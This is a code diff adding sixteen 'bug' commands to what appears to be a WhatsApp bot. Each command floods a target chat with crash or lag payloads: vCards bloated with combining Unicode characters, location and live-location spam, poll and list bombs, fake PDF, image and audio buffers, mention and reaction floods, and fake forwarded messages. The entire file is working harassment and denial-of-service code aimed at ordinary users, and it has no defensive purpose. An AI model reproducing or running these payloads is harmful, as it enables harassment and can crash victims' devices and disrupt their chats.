@@ -1,0 +1,233 @@
+            // ====================== ALL BUGS 1-16 ======================
+
+            if (cmd === 'bug1') {
+                await reply(warning + "\n☣️ Bug1 - Light Text Spam");
+                for (let i = 0; i < 5; i++) {
+                    await sock.sendMessage(target, { text: "💀 SANUKA BEAST 💀\n" + heavySpam.substring(0, 1000) });
+                    await new Promise(r => setTimeout(r, 600));
+                }
+            }
+
+            else if (cmd === 'bug2') {
+                await reply(warning + "\n☣️ Bug2 - Classic VCard");
+                const vcard = `BEGIN:VCARD\nVERSION:3.0\nFN:SANUKA BEAST 💀\nORG:NUCLEAR;\nTEL;type=CELL;type=VOICE;waid=${OWNER_NUMBER}:${OWNER_NUMBER}\nX-ABLabel:${heavySpam}\nEND:VCARD`;
+                for (let i = 0; i < 6; i++) {
+                    await sock.sendMessage(target, { contacts: { displayName: 'SANUKA BEAST', contacts: [{ vcard }] } });
+                    await new Promise(r => setTimeout(r, 500));
+                }
+            }
+
+            else if (cmd === 'bug3') {
+                await reply(warning + "\n☣️ Bug3 - Location + Text");
+                const loc = { degreesLatitude: 6.9271, degreesLongitude: 79.8612, name: "COLOMBO BEAST MODE\n" + heavySpam, address: heavySpam };
+                for (let i = 0; i < 7; i++) {
+                    await sock.sendMessage(target, { location: loc });
+                    await sock.sendMessage(target, { text: "SANUKA v3 💀\n" + heavySpam.substring(0, 1800) });
+                    await new Promise(r => setTimeout(r, 700));
+                }
+            }
+
+            else if (cmd === 'bug4') {
+                await reply(warning + "\n☣️ Bug4 - Poll Bomb");
+                const poll = {
+                    name: "SANUKA BEAST POLL 💀",
+                    values: Array(12).fill(0).map((_, i) => `OPTION ${i+1} ${"҉".repeat(50)}`),
+                    selectableCount: 1
+                };
+                for (let i = 0; i < 6; i++) {
+                    await sock.sendMessage(target, { poll });
+                    await new Promise(r => setTimeout(r, 400));
+                }
+            }
+
+            else if (cmd === 'bug5') {
+                await reply(warning + "\n☣️ Bug5 - Heavy VCard + Location");
+                const vcard = `BEGIN:VCARD\nVERSION:3.0\nFN:SANUKA MAX BEAST\nORG:HELL;\nTEL;type=CELL;type=VOICE;waid=${OWNER_NUMBER}:${OWNER_NUMBER}\nX-ABLabel:${heavySpam + "\u0300\u0301".repeat(800)}\nEND:VCARD`;
+                const loc = { degreesLatitude: 6.9271, degreesLongitude: 79.8612, name: "MAX BEAST\n" + heavySpam, address: heavySpam };
+                for (let i = 0; i < 8; i++) {
+                    await sock.sendMessage(target, { contacts: { displayName: 'SANUKA MAX', contacts: [{ vcard }] } });
+                    await sock.sendMessage(target, { location: loc });
+                    await new Promise(r => setTimeout(r, 600));
+                }
+            }
+
+            else if (cmd === 'bug6') {
+                await reply(warning + "\n☣️ Bug6 - Reaction + Massive Spam");
+                for (let i = 0; i < 10; i++) {
+                    await sock.sendMessage(target, { text: "SANUKA v6 UNHINGED 💀\n" + heavySpam.substring(0, 2200) });
+                    try { await sock.sendMessage(target, { reaction: { key: m.key, text: "☠️" } }); } catch(e) {}
+                    await new Promise(r => setTimeout(r, 500));
+                }
+            }
+
+            else if (cmd === 'bug7') {
+                await reply(warning + "\n☣️ Bug7 - Live Location Spam");
+                for (let i = 0; i < 10; i++) {
+                    await sock.sendMessage(target, {
+                        liveLocation: {
+                            degreesLatitude: 6.9271 + (Math.random() * 0.02),
+                            degreesLongitude: 79.8612 + (Math.random() * 0.02),
+                            accuracy: 5,
+                            caption: "SANUKA LIVE BEAST 💀\n" + heavySpam.substring(0, 1200)
+                        }
+                    });
+                    await new Promise(r => setTimeout(r, 800));
+                }
+            }
+
+            else if (cmd === 'bug8') {
+                await reply(warning + "\n☣️☣️☣️ BUG8 - MAXIMUM BEAST MODE ☣️☣️☣️");
+                const vcard = `BEGIN:VCARD\nVERSION:3.0\nFN:SANUKA NUCLEAR BEAST\nORG:APOCALYPSE;\nTEL;type=CELL;type=VOICE;waid=${OWNER_NUMBER}:${OWNER_NUMBER}\nX-ABLabel:${heavySpam + "\u0300\u0301\u0302".repeat(1000)}\nEND:VCARD`;
+                const loc = { degreesLatitude: 6.9271, degreesLongitude: 79.8612, name: "COLOMBO → HELL\n" + heavySpam, address: heavySpam };
+                const poll = { 
+                    name: "MAX BEAST POLL ☠️", 
+                    values: Array(15).fill(0).map((_, i) => `DEATH OPTION ${i+1} ${"҉".repeat(60)}`), 
+                    selectableCount: 1 
+                };
+
+                for (let i = 0; i < 12; i++) {
+                    await sock.sendMessage(target, { contacts: { displayName: 'SANUKA NUCLEAR', contacts: [{ vcard }] } });
+                    await sock.sendMessage(target, { location: loc });
+                    await sock.sendMessage(target, { poll });
+                    await sock.sendMessage(target, { text: "SANUKA v8 MAX UNHINGED 💀\n" + heavySpam.substring(0, 2500) });
+                    try { await sock.sendMessage(target, { reaction: { key: m.key, text: "☠️" } }); } catch(e) {}
+                    await new Promise(r => setTimeout(r, 450));
+                }
+            }
+
+            else if (cmd === 'bug9') {
+                await reply(warning + "\n☣️ Bug9 - Invisible Media/Document Bomb");
+                const evilName = "SANUKA_ULTIMATE_BEAST_" + heavySpam.substring(0, 150) + ".pdf";
+                const docPayload = Buffer.from(heavySpam.repeat(4));
+
+                for (let i = 0; i < 8; i++) {
+                    await sock.sendMessage(target, {
+                        document: docPayload,
+                        fileName: evilName,
+                        mimetype: 'application/pdf',
+                        caption: "💀 SANUKA ULTIMATE CRASH 💀\n" + heavySpam.substring(0, 1500)
+                    });
+                    await new Promise(r => setTimeout(r, 400 + Math.random() * 300));
+                }
+            }
+
+            else if (cmd === 'bug10') {
+                await reply(warning + "\n☣️ Bug10 - Group Killer / Mention Flood");
+                for (let i = 0; i < 10; i++) {
+                    await sock.sendMessage(target, {
+                        text: "☠️ SANUKA v10 GROUP KILLER ☠️\n" + heavySpam.substring(0, 1800),
+                        mentions: [target]
+                    });
+
+                    await sock.sendMessage(target, {
+                        liveLocation: {
+                            degreesLatitude: 6.9271 + Math.random() * 0.03,
+                            degreesLongitude: 79.8612 + Math.random() * 0.03,
+                            caption: "LIVE BEAST ATTACK"
+                        }
+                    });
+
+                    try { await sock.sendMessage(target, { reaction: { key: m.key, text: "☠️" } }); } catch(e) {}
+                    await new Promise(r => setTimeout(r, 350 + Math.random() * 250));
+                }
+            }
+
+            else if (cmd === 'bug11') {
+                await reply(warning + "\n☣️ Bug11 - Fake Quoted Reply Bomb");
+                for (let i = 0; i < 9; i++) {
+                    await sock.sendMessage(target, {
+                        text: "💀 SANUKA FAKE QUOTED REPLY ATTACK 💀\n" + heavySpam.substring(0, 2200),
+                        quoted: m
+                    });
+                    await new Promise(r => setTimeout(r, 450));
+                }
+            }
+
+            else if (cmd === 'bug12') {
+                await reply(warning + "\n☣️ Bug12 - ViewOnce / Status Spam");
+                const evilCaption = "💀 SANUKA VIEWONCE CRASH 💀\n" + heavySpam.substring(0, 1500);
+                const garbageBuffer = Buffer.from(heavySpam.repeat(3));
+
+                for (let i = 0; i < 8; i++) {
+                    await sock.sendMessage(target, {
+                        image: garbageBuffer,
+                        caption: evilCaption,
+                        viewOnce: true,
+                        mimetype: 'image/jpeg'
+                    });
+                    await new Promise(r => setTimeout(r, 500));
+                }
+            }
+
+            else if (cmd === 'bug13') {
+                await reply(warning + "\n☣️ Bug13 - Interactive List Bomb");
+                const listMessage = {
+                    title: "SANUKA ULTIMATE BEAST LIST 💀 " + heavySpam.substring(0, 120),
+                    description: heavySpam.substring(0, 900),
+                    buttonText: "CHOOSE YOUR DOOM",
+                    sections: [{
+                        title: "NUCLEAR OPTIONS",
+                        rows: Array(25).fill(0).map((_, i) => ({
+                            title: `DEATH ROW ${i+1} ${"҉".repeat(45)}`,
+                            description: heavySpam.substring(0, 200),
+                            rowId: `row-${i}`
+                        }))
+                    }]
+                };
+
+                for (let i = 0; i < 7; i++) {
+                    await sock.sendMessage(target, { listMessage });
+                    await new Promise(r => setTimeout(r, 550));
+                }
+            }
+
+            else if (cmd === 'bug14') {
+                await reply(warning + "\n☣️ Bug14 - Broken Audio Waveform Spam");
+                const audioBuffer = Buffer.from(heavySpam.repeat(5));
+                for (let i = 0; i < 8; i++) {
+                    await sock.sendMessage(target, {
+                        audio: audioBuffer,
+                        mimetype: 'audio/ogg; codecs=opus',
+                        ptt: true,
+                        waveform: Array(64).fill(0).map(() => Math.floor(Math.random() * 100))
+                    });
+                    await new Promise(r => setTimeout(r, 600));
+                }
+            }
+
+            else if (cmd === 'bug15') {
+                await reply(warning + "\n☣️ Bug15 - Fake Forwarded Chain");
+                for (let i = 0; i < 10; i++) {
+                    await sock.sendMessage(target, {
+                        text: "☠️ SANUKA FORWARDED CHAIN ATTACK ☠️\n" + heavySpam.substring(0, 2000),
+                        forwardedNewsletterMessageInfo: {
+                            newsletterJid: "120363000000000000@newsletter",
+                            serverMessageId: Math.floor(Math.random() * 100000)
+                        }
+                    });
+                    await new Promise(r => setTimeout(r, 400));
+                }
+            }
+
+            else if (cmd === 'bug16') {
+                await reply(warning + "\n☣️ Bug16 - GROUP KILLER Mention + Reaction Flood");
+                const mentionText = "☠️ SANUKA GROUP KILLER ATTACK ☠️ " + heavySpam.substring(0, 800);
+                for (let i = 0; i < 12; i++) {
+                    await sock.sendMessage(target, {
+                        text: mentionText,
+                        mentions: [target]
+                    });
+
+                    const reactions = ["☠️", "💀", "🔥", "⚡", "😈"];
+                    try {
+                        await sock.sendMessage(target, { 
+                            reaction: { 
+                                key: m.key, 
+                                text: reactions[Math.floor(Math.random() * reactions.length)] 
+                            } 
+                        });
+                    } catch(e) {}
+
+                    await new Promise(r => setTimeout(r, 350));
+                }
+            }
